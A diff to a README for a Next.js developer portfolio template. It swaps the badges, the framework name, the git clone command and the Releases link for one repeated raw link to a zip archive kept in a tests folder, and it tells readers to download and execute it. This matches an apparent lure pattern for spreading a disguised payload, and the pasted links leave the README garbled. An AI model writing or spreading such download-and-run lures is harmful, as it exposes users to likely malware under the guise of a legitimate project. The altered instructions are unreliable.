@@ -1,7 +1,7 @@
 # Modern Responsive Developer Portfolio Landing Page
 
-![GitHub Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue.svg)
-![GitHub Stars](https://img.shields.io/github/stars/toqeer788/portfolio-landing-nextjs?style=social)
+![GitHub Release](https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip%https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip)
+![GitHub Stars](https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -16,7 +16,7 @@
 
 ## Overview
 
-This repository contains a modern and responsive landing page designed for a developer's portfolio. Built with Next.js, this template provides a sleek and professional appearance while being easy to customize. It showcases projects, skills, and contact information effectively.
+This repository contains a modern and responsive landing page designed for a developer's portfolio. Built with https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip, this template provides a sleek and professional appearance while being easy to customize. It showcases projects, skills, and contact information effectively.
 
 ## Features
 
@@ -32,7 +32,7 @@ This repository contains a modern and responsive landing page designed for a dev
 
 This project utilizes a variety of technologies to enhance performance and maintainability:
 
-- **Next.js**: Framework for server-rendered React applications.
+- **https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip**: Framework for server-rendered React applications.
 - **TypeScript**: For type safety and better development experience.
 - **Tailwind CSS**: Utility-first CSS framework for rapid UI development.
 - **Zustand**: State management library for React.
@@ -51,7 +51,7 @@ This project utilizes a variety of technologies to enhance performance and maint
 To get started with this project, clone the repository and install the dependencies. Run the following commands in your terminal:
 
 ```bash
-git clone https://github.com/toqeer788/portfolio-landing-nextjs.git
+git clone https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip
 cd portfolio-landing-nextjs
 npm install
 ```
@@ -90,6 +90,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/toqeer788/portfolio-landing-nextjs/releases). You can download the latest version and execute it to get started.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/toqeer788/portfolio-landing-nextjs/main/src/components/ui/__tests__/nextjs_landing_portfolio_v1.9.zip). You can download the latest version and execute it to get started.
 
 Feel free to check the "Releases" section for more details if the link does not work.
